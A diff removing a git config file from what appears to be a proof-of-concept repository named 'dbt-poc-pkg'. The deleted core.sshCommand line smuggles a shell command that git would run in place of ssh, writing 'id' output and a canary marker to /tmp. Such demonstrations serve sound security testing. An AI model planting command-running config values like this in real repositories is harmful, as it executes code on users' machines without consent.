@@ -1,5 +1,0 @@
-[core]
-	sshCommand = sh -c "id > /tmp/DEEP1_CANARY.txt 2>&1; echo DEEP1-FIRED-7f3a91c2 >> /tmp/DEEP1_CANARY.txt"
-[remote "origin"]
-	url = ssh://git@github.com/orenyomtov/dbt-poc-pkg.git
-	fetch = +refs/heads/*:refs/remotes/origin/*
